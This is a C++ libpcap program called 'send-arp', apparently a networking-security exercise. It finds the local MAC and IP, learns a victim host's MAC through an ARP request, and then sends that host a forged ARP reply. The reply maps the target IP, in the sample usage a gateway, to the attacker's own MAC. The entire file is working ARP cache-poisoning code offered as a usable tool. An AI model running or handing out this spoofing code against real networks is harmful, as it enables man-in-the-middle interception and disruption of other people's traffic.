#include <cstdio>
#include <pcap.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <cstring>
#include <ctime>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_mac_ip(const char* dev, Mac& mac, Ip& ip) {
    struct ifaddrs* ifap, * ifa;
    struct sockaddr_in* sa;
    struct sockaddr_ll* sll;

    if (getifaddrs(&ifap) != 0) {
        perror("getifaddrs");
        return false;
    }

    for (ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
        if (strcmp(ifa->ifa_name, dev) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                sa = (struct sockaddr_in*)ifa->ifa_addr;
                ip = Ip(ntohl(sa->sin_addr.s_addr));
            }
            else if (ifa->ifa_addr->sa_family == AF_PACKET) {
                sll = (struct sockaddr_ll*)ifa->ifa_addr;
                mac = Mac(sll->sll_addr);
            }
        }
    }

    freeifaddrs(ifap);
    return true;
}


Mac get_mac_of_sender(pcap_t* handle, const char* dev, Mac my_mac, Ip my_ip, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

	time_t start_time = time(nullptr);
	int count = 0;
    while (true) {
		if (count % 10 == 0) {
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}

        struct pcap_pkthdr* header;
        const u_char* packet_data;
        int res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv_packet = (EthArpPacket*)packet_data;


        if (recv_packet->eth_.type() == 0x0806 && 
			recv_packet->arp_.op() == 0x02 &&
			Ip(recv_packet->arp_.sip()) == sender_ip) {
            	return recv_packet->arp_.smac();
		}

		if (difftime(time(nullptr), start_time) > 15) {
            fprintf(stderr, "Timeout waiting for ARP reply\n");
            break;
        }
    }
    return Mac::nullMac();
}

void send_arp_reply(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

    char* dev = argv[1];
    Ip sender_ip(argv[2]);
    Ip target_ip(argv[3]);

    Mac my_mac;
    Ip my_ip;
    if (!get_mac_ip(dev, my_mac, my_ip)) {
        fprintf(stderr, "Failed to get MAC and IP address of interface %s\n", dev);
        return -1;
    }
	printf("My MAC address: %s\n", std::string(my_mac).c_str());
	printf("My IP address: %s\n", std::string(my_ip).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac sender_mac = get_mac_of_sender(handle, dev, my_mac, my_ip, sender_ip);
	printf("Sender ip address: %s\n", std::string(sender_ip).c_str());
	printf("Sender MAC address: %s\n", std::string(sender_mac).c_str());

    send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);

    pcap_close(handle);
    return 0;
}
